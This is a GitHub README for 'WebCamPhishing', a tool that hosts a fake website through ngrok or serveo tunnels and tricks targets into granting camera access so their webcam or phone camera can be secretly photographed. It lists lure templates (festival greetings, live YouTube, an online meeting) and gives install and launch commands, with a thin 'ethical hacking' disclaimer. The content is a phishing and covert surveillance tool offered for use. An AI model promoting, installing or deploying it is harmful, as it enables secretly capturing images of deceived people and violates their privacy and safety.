<h1 align="center">WebCamPhishing</h1>

<br />

<div align="center">
  <strong>Bypassing camera on any device using a php server and javascript for client-side.</strong>
</div>

<div align="center">
  <strong>Version 1.5 [Beta]</strong>
</div>

<br />

# What is WebCamPhishing?
<p>WebCamPhishing is techniques to take cam shots of target's phone front camera or PC webcam. WebCamPhishing hosts a fake website on in built PHP server and uses ngrok & serveo to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device.</p>

## Features
<p>In this tool I added two automatic webpage templates for engaged target on webpage to get more picture of cam</p>
<ul>
  <li>Festival Wishing</li>
  <li>Live YouTube TV</li>
   <li>Online Meeting [Beta]</li>
</ul>
<p>Simply enter festival name or youtube's video ID</p>

## This tool tested on:
<ul>
  <li>Kali Linux</li>
  <li>Termux</li>
  <li>Mac OS</li>
  <li>Ubuntu</li>
  <li>Arch Linux</li>
  <li>Windows WSL</li>
  <li>Tails OS</li>
  <li>Parrot Security Linux</li>
</ul>

# Installing and requirements
<p>Update and upgrade packages</p>

```
sudo apt update && sudo apt -y upgrade 
```

<p>This tool require PHP for webserver, SSH or Serveo link. First run following command on your terminal</p>

```
sudo apt -y install php openssh git wget unzip gzip
```

## Follow the command to use the module/script:

```
git clone https://github.com/jasut1n/WebCamPhishing
cd WebCamPhishing
chmod +x webcamphish.sh
sudo ./webcamphish.sh
```

## Change Log:

<p><b>Version: 1.5:</b> Added new online meeting template</p>
<p><b>Version: 1.4:</b> Ngrok authtoken update</p>
<p><b>Version: 1.3:</b> Fix ngrok direct link</p>

### Credits

<p>WebCamPhishing is created to help in penetration testing and ethical hacking it's not responsible for any misuse or illegal purposes.</p>
<p>WebCamPhishing is inspired by https://github.com/thelinuxchoice/ and https://github.com/techchipnet/ Big thanks to @thelinuxchoice and @techchip</p>

## ©
<br />

<div align="center">
  <strong>Copyright of Justine Dela Torre (Jasutin)</strong>
</div>

<div align="center">
  <strong>This WebCamPhishing module/script is based only on my knowledge, and please use this only on educational purposes and also WebCamPhishing is created to help           in penetration testing and ethical hacking it's not responsible for any misuse or illegal purposes.</strong>
</div>

<br />
